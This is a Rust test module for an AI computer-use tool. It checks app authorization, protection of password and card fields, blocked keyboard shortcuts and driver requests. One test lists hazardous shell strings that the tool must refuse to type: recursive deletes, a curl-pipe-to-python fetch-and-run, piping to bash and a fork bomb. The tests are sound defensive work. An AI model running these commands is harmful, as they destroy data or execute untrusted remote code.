        assert!(
            window_needs_restore(&window),
            "the live TextEdit trace exposed a full-size hidden document beside its shelf thumbnail"
        );

        window.is_on_screen = true;
        window.on_current_space = Some(false);
        assert!(window_needs_restore(&window));
    }

    #[test]
    #[cfg(not(target_os = "windows"))]
    fn stage_manager_shelf_proxy_collapses_into_the_real_hidden_window() {
        let (_root, state) = configured_window_state();
        let mut document = fixture_windows().remove(0);
        document.window_id = 4460;
        document.title.clear();
        document.width = 500.0;
        document.height = 500.0;
        document.is_on_screen = false;
        document.on_current_space = None;

        let mut shelf_proxy = document.clone();
        shelf_proxy.window_id = 4461;
        shelf_proxy.title = "Untitled".to_string();
        shelf_proxy.width = 80.0;
        shelf_proxy.height = 102.0;
        shelf_proxy.is_on_screen = true;

        let candidates = collapse_stage_manager_shelf_surfaces(vec![document.clone(), shelf_proxy]);
        assert_eq!(candidates.len(), 1);
        assert_eq!(candidates[0].window_id, document.window_id);
        assert!(window_needs_restore(&candidates[0]));
        assert_eq!(
            select_window(&state, &candidates, Some("TextEdit"), None)
                .expect("the real TextEdit document must be unambiguous")
                .window_id,
            document.window_id
        );
    }

    #[test]
    fn open_app_accepts_display_names_but_rejects_sensitive_or_path_targets() {
        assert_eq!(
            open_app_name(&json!({ "app": " TextEdit " })).expect("safe app"),
            "TextEdit"
        );
        for arguments in [
            json!({}),
            json!({ "app": "" }),
            json!({ "app": "Terminal" }),
            json!({ "app": "/System/Applications/TextEdit.app" }),
            json!({ "app": "file:///Applications/TextEdit.app" }),
        ] {
            assert!(open_app_name(&arguments).is_err(), "{arguments}");
        }
    }

    #[test]
    fn sensitive_fields_are_never_automated() {
        let target = TargetContext {
            native_owner: None,
            pid: 1,
            window_id: 2,
            app_name: "Safari".to_string(),
            identity: fixture_identity(
                "com.apple.Safari",
                "/Applications/Safari.app/Contents/MacOS/Safari",
            ),
            elements: HashMap::from([
                (
                    1,
                    ElementSummary {
                        role: "AXTextField".to_string(),
                        label: "Email".to_string(),
                        metadata: "AXTextField \"Email\"".to_string(),
                    },
                ),
                (
                    2,
                    ElementSummary {
                        role: "AXSecureTextField".to_string(),
                        label: "Password".to_string(),
                        metadata: "AXSecureTextField \"Password\"".to_string(),
                    },
                ),
                (
                    3,
                    ElementSummary {
                        role: "AXTextField".to_string(),
                        label: "Card number".to_string(),
                        metadata: "AXTextField \"Card number\" autocomplete=cc-number".to_string(),
                    },
                ),
            ]),
            capture_path: None,
            capture_sha256: None,
            capture_generation: 1,
            bounds: crate::computer_use_cursor::ScreenRect {
                x: 0.0,
                y: 0.0,
                width: 800.0,
                height: 600.0,
            },
        };
        assert!(ensure_element_not_sensitive(&target, 1).is_ok());
        assert!(ensure_element_not_sensitive(&target, 2).is_err());
        assert!(ensure_element_not_sensitive(&target, 3).is_err());
        assert!(ensure_element_not_sensitive(&target, 99).is_err());
    }

    #[test]
    fn key_input_cannot_bypass_sensitive_element_checks() {
        let (_root, state) = configured_window_state();
        let mut target = fixture_target();
        target.elements.insert(
            9,
            ElementSummary {
                role: "AXSecureTextField".to_string(),
                label: "Password".to_string(),
                metadata: "AXSecureTextField \"Password\"".to_string(),
            },
        );

        assert!(
            validate_sensitive_action(&state, "key", &json!({ "keys": "a" }), &target).is_err()
        );
        assert!(validate_sensitive_action(
            &state,
            "key",
            &json!({ "keys": "a", "element": 7 }),
            &target,
        )
        .is_ok());
        assert!(validate_sensitive_action(
            &state,
            "key",
            &json!({ "keys": "a", "element": 9 }),
            &target,
        )
        .is_err());
        assert!(
            validate_sensitive_action(&state, "key", &json!({ "keys": "shift+a" }), &target)
                .is_err()
        );
        assert!(
            validate_sensitive_action(&state, "key", &json!({ "keys": "ctrl+s" }), &target).is_ok()
        );
        assert!(
            validate_sensitive_action(&state, "key", &json!({ "keys": "esc" }), &target).is_ok()
        );
    }

    #[test]
    fn destructive_and_clipboard_shortcuts_are_blocked() {
        for keys in [
            "cmd+q",
            "cmd+shift+q",
            "cmd+ctrl+q",
            "cmd+option+escape",
            "cmd+v",
            "command+c",
            "cmd+tab",
            "cmd+space",
            "ctrl+left",
            "ctrl+right",
            "ctrl+space",
            "cmd+option+h",
            "cmd+option+m",
            "cmd+shift+5",
        ] {
            assert!(blocked_key_combo_for_platform(keys, false), "{keys}");
        }
        assert!(!blocked_key_combo_for_platform("cmd+s", false));
        assert!(!blocked_key_combo_for_platform("return", false));
    }

    #[test]
    fn windows_shortcuts_and_pointer_modifiers_cannot_escape_the_target() {
        for keys in [
            "cmd+r",
            "win+r",
            "meta+l",
            "ctrl+c",
            "control+v",
            "ctrl+x",
            "alt+tab",
            "alt+f4",
            "alt+space",
            "ctrl+escape",
            "ctrl+shift+escape",
            "ctrl+alt+delete",
            "ctrl+insert",
            "shift+insert",
            "shift+delete",
            "ctrl+space",
            "printscreen",
        ] {
            assert!(blocked_key_combo_for_platform(keys, true), "{keys}");
        }
        for keys in ["ctrl+s", "ctrl+a", "ctrl+left", "return", "shift+f10"] {
            assert!(!blocked_key_combo_for_platform(keys, true), "{keys}");
        }
        assert!(validated_modifiers_for_platform(&json!({"modifiers":["cmd"]}), true).is_err());
        assert!(
            validated_modifiers_for_platform(&json!({"modifiers":["ctrl","shift"]}), true).is_ok()
        );
        assert!(validated_modifiers_for_platform(&json!({"modifiers":["cmd"]}), false).is_ok());
    }

    #[cfg(target_os = "macos")]
    #[test]
    fn stage_companion_behavior_joins_apps_without_conflicting_stage_roles() {
        use objc2_app_kit::NSWindowCollectionBehavior;

        let current = NSWindowCollectionBehavior::Managed
            | NSWindowCollectionBehavior::MoveToActiveSpace
            | NSWindowCollectionBehavior::Primary
            | NSWindowCollectionBehavior::FullScreenNone;
        let companion = computer_use_stage_companion_behavior(current);

        assert!(companion.contains(NSWindowCollectionBehavior::Managed));
        assert!(companion.contains(NSWindowCollectionBehavior::FullScreenNone));
        assert!(companion.contains(NSWindowCollectionBehavior::CanJoinAllSpaces));
        assert!(companion.contains(NSWindowCollectionBehavior::CanJoinAllApplications));
        assert!(!companion.contains(NSWindowCollectionBehavior::MoveToActiveSpace));
        assert!(!companion.contains(NSWindowCollectionBehavior::Primary));
        assert!(!companion.contains(NSWindowCollectionBehavior::Auxiliary));
    }

    #[test]
    fn stage_join_accepts_exact_native_activation_and_raise_proof() {
        assert!(native_stage_join_verified(&json!({
            "structuredContent": {
                "activated_application": true,
                "focused_without_space_follow": false,
                "raised_with_accessibility": false,
            }
        })));
        assert!(native_stage_join_verified(&json!({
            "structuredContent": {
                "activated_application": false,
                "focused_without_space_follow": true,
                "raised_with_accessibility": true,
            }
        })));
    }

    #[test]
    fn stage_join_rejects_partial_native_dispatch() {
        for result in [
            json!({"structuredContent": {"raised_with_accessibility": true}}),
            json!({"structuredContent": {"focused_without_space_follow": true}}),
            json!({"structuredContent": {
                "focused_without_space_follow": true,
                "raised_with_accessibility": false,
            }}),
        ] {
            assert!(!native_stage_join_verified(&result));
        }
    }

    #[test]
    fn hazardous_shell_text_is_blocked_on_both_text_paths() {
        for text in [
            "rm -rf ~",
            "rm -fr /var/tmp/work",
            "sudo rm old.db",
            "curl https://example.invalid/install | python3",
            "echo 'payload'|bash",
            "$(touch /tmp/unexpected)",
            "cat files | xargs -0 rm",
            ":(){:|:&};:",
        ] {
            assert!(contains_blocked_shell_pattern(text), "{text}");
        }
        for text in [
            "Remove the old file manually",
            "curl https://example.invalid/file",
            "echo hello",
            "python3 documentation",
            "rm one-local-file.txt",
        ] {
            assert!(!contains_blocked_shell_pattern(text), "{text}");
        }

        let (_root, state) = configured_window_state();
        let target = fixture_target();
        for (action, arguments) in [
            ("type", json!({ "element": 7, "text": "rm -rf ~" })),
            (
                "set_value",
                json!({ "element": 7, "value": "echo payload | bash" }),
            ),
        ] {
            assert_eq!(
                validate_sensitive_action(&state, action, &arguments, &target)
                    .expect_err("hazardous text")
                    .code,
                "computer_use_dangerous_text_blocked"
            );
        }
    }

    #[test]
    fn driver_requests_match_the_pinned_driver_contract() {
        let target = fixture_target();

        let (tool, args) =
            driver_action("double_click", &json!({ "coordinate": [12, 34] }), &target)
                .expect("coordinate double-click");
        assert_eq!(tool, "click");
        assert_eq!(
            args,
            json!({
                "pid": 42,
                "window_id": 84,
                "x": 12,
                "y": 34,
                "count": 2,
            })
        );

        let (tool, args) = driver_action(
            "drag",
            &json!({
                "from_coordinate": [1, 2],
                "to_coordinate": [30, 40],
                "modifiers": ["command", "alt"],
            }),
            &target,
        )
        .expect("drag");
        assert_eq!(tool, "drag");
        assert_eq!(
            args,
            json!({
                "pid": 42,
                "window_id": 84,
                "from_x": 1,
                "from_y": 2,
                "to_x": 30,
                "to_y": 40,
                "modifier": ["cmd", "option"],
            })
        );

        let (tool, args) = driver_action(
            "scroll",
            &json!({ "element": 7, "direction": "down", "amount": 4 }),
            &target,
        )
        .expect("scroll");
        assert_eq!(tool, "scroll");
        assert_eq!(
            args,
            json!({
                "pid": 42,
                "window_id": 84,
                "element_index": 7,
                "direction": "down",
                "amount": 4,
            })
        );

        let (tool, args) =
            driver_action("type", &json!({ "element": 7, "text": "hello" }), &target)
                .expect("type");
        assert_eq!(tool, "type_text");
        assert_eq!(
            args,
            json!({
                "pid": 42,
                "window_id": 84,
                "element_index": 7,
                "text": "hello",
            })
        );

        let (tool, args) =
            driver_action("key", &json!({ "element": 7, "keys": "return" }), &target)
                .expect("single key");
        assert_eq!(tool, "press_key");
        assert_eq!(
            args,
            json!({
                "pid": 42,
                "window_id": 84,
                "element_index": 7,
                "key": "return",
            })
        );

        let (tool, args) =
            driver_action("key", &json!({ "keys": "esc" }), &target).expect("escape alias");
        assert_eq!(tool, "press_key");
        assert_eq!(args, json!({ "pid": 42, "window_id": 84, "key": "escape" }));

        let (tool, args) =
            driver_action("key", &json!({ "keys": "cmd+s" }), &target).expect("shortcut");
        assert_eq!(tool, "hotkey");
        assert_eq!(
            args,
            json!({ "pid": 42, "window_id": 84, "keys": ["cmd", "s"] })
        );
    }

    #[test]
    fn malformed_or_ambiguous_driver_requests_fail_before_approval() {
        let target = fixture_target();
        for arguments in [
            json!({ "element": 7, "modifiers": ["cmd"] }),
            json!({ "element": u64::from(u32::MAX) + 1 }),
            json!({ "coordinate": [1, 2], "modifiers": ["cmd", "cmd"] }),
            json!({ "coordinate": [-1, 2] }),
            json!({ "coordinate": [1, 2], "button": "middle" }),
        ] {
            assert!(driver_action("click", &arguments, &target).is_err());
        }
        assert!(driver_action(
            "scroll",
            &json!({ "element": 7, "direction": "diagonal" }),
            &target,
        )
        .is_err());
        assert!(driver_action(
            "scroll",
            &json!({ "element": 7, "direction": "down", "amount": 0 }),
            &target,
        )
        .is_err());
        assert!(driver_action(
            "scroll",
            &json!({ "element": u64::from(u32::MAX) + 1, "direction": "down" }),
            &target,
        )
        .is_err());
        for keys in ["cmd+shift", "cmd+s+x", "cmd+cmd+s", "volumeup", "💥"] {
            assert!(
                driver_action("key", &json!({ "keys": keys }), &target).is_err(),
                "{keys}"
            );
        }
    }

    #[test]
    fn element_parser_and_cap_preserve_numbered_targets() {
        let tree = r#"AXWindow "Document"
  - [1] AXButton "Save"
  - [element_index 2] AXTextField id=Body
  - [3] AXButton "Delete""#;
        let parsed = parse_elements(tree, 2);
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[&1].label, "Save");
        assert_eq!(parsed[&2].label, "Body");
        let capped = cap_tree(tree, 2);
        assert!(capped.contains("[1]"));
        assert!(capped.contains("[element_index 2]"));
        assert!(!capped.contains("[3]"));
    }

    #[test]
    fn approved_capture_and_element_references_fail_closed_when_stale() {
        let approved = TargetContext {
            native_owner: None,
            pid: 10,
            window_id: 20,
            app_name: "TextEdit".to_string(),
            identity: fixture_identity(
                "com.apple.TextEdit",
                "/System/Applications/TextEdit.app/Contents/MacOS/TextEdit",
            ),
            elements: HashMap::from([
                (
                    1,
                    ElementSummary {
                        role: "AXButton".to_string(),
                        label: "Save".to_string(),
                        metadata: "AXButton \"Save\"".to_string(),
                    },
                ),
                (
                    2,
                    ElementSummary {
                        role: "AXTextArea".to_string(),
                        label: "Body".to_string(),
                        metadata: "AXTextArea \"Body\" editable=true".to_string(),
                    },
                ),
            ]),
            capture_path: Some("/tmp/capture.png".to_string()),
            capture_sha256: Some("abc".to_string()),
            capture_generation: 4,
            bounds: crate::computer_use_cursor::ScreenRect {
                x: 50.0,
                y: 75.0,
                width: 800.0,
                height: 600.0,
            },
        };
        let mut replacement = approved.clone();
        assert!(same_target_capture(&approved, &replacement));
        replacement.capture_generation += 1;
        assert!(!same_target_capture(&approved, &replacement));

        let type_refs = referenced_elements("type", &json!({ "text": "hello", "element": 2 }));
        assert_eq!(type_refs, vec![2]);
        assert_eq!(
            referenced_elements("key", &json!({ "element": 1 })),
            vec![1]
        );
        assert!(referenced_elements(
            "drag",
            &json!({ "from_coordinate": [2, 3], "to_coordinate": [4, 5] }),
        )
        .is_empty());
        assert!(referenced_elements("click", &json!({ "coordinate": [4, 5] })).is_empty());

        assert!(validate_element_references(&approved, &approved.elements, &[1, 2]).is_ok());
        let mut changed = approved.elements.clone();
        changed.insert(
            2,
            ElementSummary {
                role: "AXSecureTextField".to_string(),
                label: "Password".to_string(),
                metadata: "AXSecureTextField \"Password\"".to_string(),
            },
        );
        assert_eq!(
            validate_element_references(&approved, &changed, &[2])
                .expect_err("changed element must fail")
                .code,
            "computer_use_element_stale"
        );
    }

    #[test]
    fn capture_digest_is_stable_and_rejects_non_images() {
        let png = b"\x89PNG\r\n\x1a\nfixture";
        let result = json!({
            "content": [{ "type": "image", "data": BASE64.encode(png) }]
        });
        let digest = capture_sha256(&result).expect("digest");
        assert_eq!(digest, capture_sha256(&result).expect("repeat digest"));
        let invalid = json!({
            "content": [{ "type": "image", "data": BASE64.encode(b"plain text") }]
        });
        assert!(capture_sha256(&invalid).is_err());
    }

    #[test]
    fn capture_result_labels_chat_image_without_exposing_host_path() {
        let result = json!({
            "content": [
                { "type": "text", "text": "[1] AXButton \"Save\"" },
                { "type": "image", "data": BASE64.encode(b"\x89PNG\r\n\x1a\nfixture") },
            ],
            "structuredContent": { "tree_markdown": "[1] AXButton \"Save\"" },
        });
        let sanitized = sanitize_capture_result(
            result,
            "TextEdit",
            Some("/Users/alice/Library/Application Support/Clovy/captures/capture.png"),
            100,
        );
        let structured = sanitized["structuredContent"]
            .as_object()
            .expect("structured capture");
        assert_eq!(
            structured.get("label").and_then(Value::as_str),
            Some("Computer use capture of TextEdit")
        );
        assert_eq!(
            structured.get("capture_reference").and_then(Value::as_str),
            Some("capture.png")
        );
        assert!(!sanitized.to_string().contains("/Users/alice"));
    }

    #[test]
    fn app_authorizations_are_scoped_by_verified_identity_and_clear_together() {
        assert_eq!(
            requested_app_authorization(" TextEdit "),
            requested_app_authorization("textedit")
        );
        let identity = fixture_identity(
            "com.apple.TextEdit",
            "/System/Applications/TextEdit.app/Contents/MacOS/TextEdit",
        );
        let other_binary = fixture_identity(
            "com.apple.TextEdit",
            "/tmp/TextEdit.app/Contents/MacOS/TextEdit",
        );
        assert_ne!(
            identity_app_authorization(&identity),
            identity_app_authorization(&other_binary)
        );

        let state = ComputerUseState::default();
        remember_app_authorization(&state, identity_app_authorization(&identity))
            .expect("remember authorization");
        assert!(
            app_is_authorized(&state, &identity_app_authorization(&identity))
                .expect("authorization lookup")
        );
        assert!(
            !app_is_authorized(&state, &identity_app_authorization(&other_binary))
                .expect("authorization lookup")
        );
        clear_app_authorizations(&state);
        assert!(state.authorized_apps.lock().expect("lock").is_empty());

        let generation = state.attended_generation.load(Ordering::SeqCst);
        assert!(ensure_task_generation_current(&state, generation).is_ok());
        state.attended_generation.fetch_add(1, Ordering::SeqCst);
        assert_eq!(
            ensure_task_generation_current(&state, generation)
                .expect_err("new task must invalidate old authorization")
                .code,
            "computer_use_task_changed"
        );
    }

    #[test]
    fn approved_running_identity_satisfies_the_same_display_name_only() {
        let state = ComputerUseState::default();
        let windows = fixture_windows();
        let text_edit = windows[0].identity.clone();
        remember_app_authorization(&state, identity_app_authorization(&text_edit))
            .expect("remember TextEdit");

        assert_eq!(
            authorized_running_identity_for_name(&state, &windows, "textedit").expect("lookup"),
            Some(text_edit)
        );
        assert_eq!(
            authorized_running_identity_for_name(&state, &windows, "Preview").expect("lookup"),
            None
        );
    }

    #[test]
    fn ambiguous_same_name_identities_never_reuse_an_authorization() {
        let state = ComputerUseState::default();
        let mut windows = fixture_windows();
        let first = windows[0].identity.clone();
        let second = fixture_identity(
            "com.example.OtherTextEdit",
            "/Applications/Other TextEdit.app/Contents/MacOS/TextEdit",
        );
        windows.push(WindowTarget {
            native_owner: None,
            pid: 30,
            window_id: 300,
            app_name: "TextEdit".to_string(),
            identity: second.clone(),
            title: "Other note".to_string(),
            z_index: 4,
            x: 120.0,
            y: 220.0,
            width: 900.0,
            height: 700.0,
            is_on_screen: true,
            on_current_space: Some(true),
        });
        remember_app_authorization(&state, identity_app_authorization(&first))
            .expect("remember first");

        assert_eq!(
            authorized_running_identity_for_name(&state, &windows, "TextEdit").expect("lookup"),
            None
        );
    }

    #[test]
    fn driver_stamp_requires_version_and_source_commit() {
        let temp = tempfile::tempdir().expect("tempdir");
        let executable = if cfg!(target_os = "windows") {
            temp.path().join("clovy-computer-use-driver.exe")
        } else {
            temp.path()
                .join("Bundle.app/Contents/MacOS/clovy-computer-use-driver")
        };
        std::fs::create_dir_all(executable.parent().unwrap()).expect("macos dir");
        std::fs::write(&executable, b"driver").expect("driver");
        let resources = if cfg!(target_os = "windows") {
            temp.path().to_path_buf()
        } else {
            temp.path().join("Bundle.app/Contents/Resources")
        };
        std::fs::create_dir_all(&resources).expect("resources");
        let pin = driver_pin();
        std::fs::write(
            resources.join("clovy-computer-use-pin.json"),
            json!({
                "version": pin.version,
                "sourceCommit": pin.source_commit,
            })
            .to_string(),
        )
        .expect("stamp");
        assert!(driver_stamp_matches(&executable, &pin));
        std::fs::write(
            resources.join("clovy-computer-use-pin.json"),
            json!({ "version": pin.version, "sourceCommit": "wrong" }).to_string(),
        )
        .expect("bad stamp");
        assert!(!driver_stamp_matches(&executable, &pin));
    }
}
